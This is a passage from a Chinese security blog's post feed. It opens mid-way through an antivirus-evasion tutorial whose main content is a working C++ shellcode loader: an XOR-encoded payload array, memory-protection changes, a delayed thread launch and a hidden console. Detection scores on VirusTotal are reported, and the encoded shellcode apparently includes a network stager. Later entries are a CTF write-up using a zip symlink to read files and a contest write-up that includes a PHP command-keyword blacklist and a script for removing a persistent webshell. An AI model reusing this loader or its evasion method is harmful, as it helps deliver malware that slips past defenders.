ad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="免杀效果-8-66"><a href="#免杀效果-8-66" class="headerlink" title="免杀效果 8/66"></a>免杀效果 8/66</h2><p>b07db5b474a3e42e444299f28a71e6fd8d5cf808d91d2680e4bece8d4bd89fc4</p><p><img src="http://cdn.polowong.top/image-20211202152602331.png" alt="image-20211202152602331"></p><h1 id="简单加载器-修改内存页属性-sleep-shellcode-xor异或-去掉cmd黑框"><a href="#简单加载器-修改内存页属性-sleep-shellcode-xor异或-去掉cmd黑框" class="headerlink" title="简单加载器+修改内存页属性+sleep+shellcode xor异或+去掉cmd黑框"></a>简单加载器+修改内存页属性+sleep+shellcode xor异或+去掉cmd黑框</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\xad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果VT-7-64"><a href="#免杀效果VT-7-64" class="headerlink" title="免杀效果VT 7/64"></a>免杀效果VT 7/64</h2><p><img src="http://cdn.polowong.top/image-20211202161158893.png" alt="image-20211202161158893"></p><p>a7a87509ad387960dedd08a609db3fe3c935cefc52b8ae97f5b761b1ac6ff7d3</p><h1 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h1><p>本次更新于2021.12.2，静态免杀效果VT 7/64，期末了，要准备期末考试，还要看论文，只能每天抽点时间去学相关知识。</p><h1 id="todo："><a href="#todo：" class="headerlink" title="todo："></a>todo：</h1><p>远程加载shellcode</p><p>更高级的shellcode混淆方法（对称加密）</p><p>ctf 隐写shellcode？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道简单的flask-web题</title>
      <link href="2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/"/>
      <url>2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>PKU的一道简单flask web题 感觉挺有意思的<br>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> copyfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,url_for,send_from_directory,make_response,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.middleware.proxy_fix <span class="keyword">import</span> ProxyFix</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;TEMP&#x27;</span>]=<span class="string">&#x27;/dev/shm&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&quot;access&quot;</span>)</span><br><span class="line">app.wsgi_app = ProxyFix(app.wsgi_app, x_for=<span class="number">1</span> ,x_proto=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        os.system(<span class="string">&quot;rm -rf /dev/shm/zip/media/*&quot;</span>)</span><br><span class="line">        path=os.path.join(<span class="string">&quot;/dev/shm/zip/media&quot;</span>,<span class="string">&#x27;tmp.zip&#x27;</span>)<span class="comment"># 拼接文件路径</span></span><br><span class="line">        f.save(path)</span><br><span class="line">        os.system(<span class="string">&#x27;timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;rm /dev/shm/zip/media/tmp.zip&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/media/&#x27;</span>)</span><br><span class="line">    response = render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media/&lt;path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">media</span>(<span class="params">path=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    npath=os.path.join(<span class="string">&quot;/dev/shm/zip/media&quot;</span>,path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(npath):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;404&quot;</span>,<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(npath):</span><br><span class="line">        f=<span class="built_in">open</span>(npath,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        response = make_response(f.read())</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fn=os.listdir(npath)</span><br><span class="line">        fn=[<span class="string">&quot;..&quot;</span>]+fn</span><br><span class="line">        f=<span class="built_in">open</span>(<span class="string">&quot;templates/template.html&quot;</span>)</span><br><span class="line">        x=f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        ret=<span class="string">&quot;&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> fn:</span><br><span class="line">            tpath=os.path.join(<span class="string">&#x27;/media/&#x27;</span>,path,i)</span><br><span class="line">            ret+=<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+tpath+<span class="string">&quot;&#x27;&gt;&quot;</span>+i+<span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span></span><br><span class="line">        x=x.replace(<span class="string">&quot;HTMLTEXT&quot;</span>,ret)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;mkdir /dev/shm/zip&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;mkdir /dev/shm/zip/media&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>,threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大意为用户上传一个zip压缩包，服务器端解压后显示压缩包内的内容并且可以下载<img src="http://cdn.polowong.top/1637825858176qkyykata.png?imageslim" alt="paste image">类似这样。</p><p>我们可以利用Linux的软链接实现文件读取<img src="http://cdn.polowong.top/1637825912925e5ctiogo.png?imageslim" alt="paste image">下面制作一个存在软连接的zip压缩包</p><p>zip flag.zip flag –symlinks</p><p><img src="http://cdn.polowong.top/1637826007843qmy578le.png?imageslim" alt="paste image">直接下载文件得到读取的flag文件</p><p>flag{NeV3r_trUSt_Any_C0mprEsSEd_File}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>广东省强网杯运维赛部分WP</title>
      <link href="2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
      <url>2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<p>上周末打了强网杯，某赛道打了第三名拿了二等奖，上午是运维赛，下午是awd。<br>上午的运维赛出的还可以，我觉得难度相对低一点，一共12道题，到最后基本有一半的人能做出来6-8道左右，本赛道第三-八名全部是8道题。这次拿奖得亏了有pwn👴去修题，我web应急响应做的不如别人多。</p><p>吐槽：下午的AWD纯脑瘫，参赛手册写的是AWDP，赛制介绍则是AWD。不一致也就算了，下午AWD只给一道巨难的pwn是什么意思？最后放hint连exp都快放完了，最后只有高校组有1-2支队伍在打，其他赛道全在罚坐。</p><h1 id="web运维"><a href="#web运维" class="headerlink" title="web运维"></a>web运维</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>有一个存在反序列化漏洞的页面，大体意思就是传入参数之后反序列化进行命令执行，题目本身给了waf，只不过关键词比较少。如 blacklist=’\php|flag|system|&#39;;自己加一些关键字就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|file_get_contents|fwrite|curl|system|eval|shell_exec|cat|tac|more|flag|base64|assert|passthru|readfile|php\:\/\/|file\:\/\/|fread|create\_function|php|script|\&lt;\?php|\&#x27;|\&quot;|\(|\)|\&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$back_list</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$query</span>))  <span class="comment">// 假设用户输入的参数是 $query</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hack detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多加了几个关键字这题的check就过了</p><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p> ls -all 看了一下有.2.php，我直接 rm -rf 删完之后这个check点还是没有过，之后又ll看了下发现是不死马。<br> 杀不死马有2种思路，第一种是写脚本无限循环删除，python或者shell或者php脚本都可以，第二种是重启php-fpm服务。这次给的权限比较高，是root，可以直接重启。但是在大部分awd比赛中可能没有重启服务的权限，所以第一种思路是必行的。<br> 附脚本<br> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rm -rf .3.php;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;remove success&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><br>上传上去之后chmod u+x 1.sh 然后 nohup ./1.sh &amp;挂着跑就可以了。</p><h2 id="phpinfo信息泄露"><a href="#phpinfo信息泄露" class="headerlink" title="phpinfo信息泄露"></a>phpinfo信息泄露</h2><p>没啥好说的，删了就行。</p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>把源码搞下来放到D盾查杀，查到了后门，直接删掉就好，还有XXE，文件也是直接删掉就好。</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="挖矿"><a href="#挖矿" class="headerlink" 